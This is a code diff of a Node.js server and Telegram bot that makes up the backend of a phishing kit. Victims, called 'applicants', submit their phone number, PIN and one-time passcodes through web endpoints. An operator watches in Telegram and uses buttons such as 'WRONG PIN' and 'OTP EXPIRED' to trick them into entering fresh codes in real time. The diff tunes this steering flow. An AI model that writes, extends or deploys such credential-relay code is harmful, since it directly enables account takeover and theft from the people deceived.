@@ -121,19 +121,20 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
         case 'WRONG_PIN':
-          session.status = 'RETRY_PIN';
+          session.status = 'RETRY_PIN'; // Inamuru kurudi nyumbani kuweka PIN mpya
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ Wrong PIN sent. Applicant redirected back.`);
+          await bot.sendMessage(chatTarget, `❌ Wrong PIN sent. Applicant redirected back to enter new PIN.`);
           break;
         case 'OTP_EXPIRED':
-          session.status = 'RETRY_OTP1';
+        case 'WRONG_OTP':
+          session.status = 'RETRY_OTP1'; // Inamuru kurudi kuweka OTP mpya
           session.otp1 = '';
-          await bot.sendMessage(chatTarget, `❌ OTP Expired sent. Applicant redirected back.`);
+          await bot.sendMessage(chatTarget, `❌ OTP Expired/Wrong sent. Applicant redirected back to enter new OTP.`);
           break;
         case 'INVALID_OTP':
           session.status = 'RETRY_OTP2';
           session.otp2 = '';
-          await bot.sendMessage(chatTarget, `❌ Invalid OTP sent. Waiting for new incoming OTP.`);
+          await bot.sendMessage(chatTarget, `❌ Invalid OTP sent. Applicant redirected back.`);
           break;
         case 'NEXT':
           session.status = 'PROCEED_OTP2';
@@ -147,7 +148,7 @@ async function initBot() {
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Done` }).catch(() => {});
+      await bot.answerCallbackQuery(query.id, { text: `Imekamilika` }).catch(() => {});
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
       }
@@ -208,7 +209,7 @@ app.post('/api/submit-pin', async (req, res) => {
       sessions.set(activeId || 'default', session);
     }
 
-    session.phone = phone; // Store phone in session
+    session.phone = phone; 
     const targetChat = session.adminChatId;
     session.status = 'WAITING_PIN_APPROVAL';
     session.pin = pin;
@@ -223,6 +224,7 @@ app.post('/api/submit-pin', async (req, res) => {
         inline_keyboard: [
           [
             { text: 'ALLOW', callback_data: `ALLOW_${activeId}` },
+            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${activeId}` },
             { text: 'BLOCKED', callback_data: `BLOCKED_${activeId}` }
           ]
         ]
@@ -257,7 +259,6 @@ app.post('/api/submit-otp1', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${activeId}` },
             { text: 'OTP EXPIRED ❌', callback_data: `OTP_EXPIRED_${activeId}` },
             { text: 'NEXT', callback_data: `NEXT_${activeId}` }
           ]
@@ -312,4 +313,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+                                 
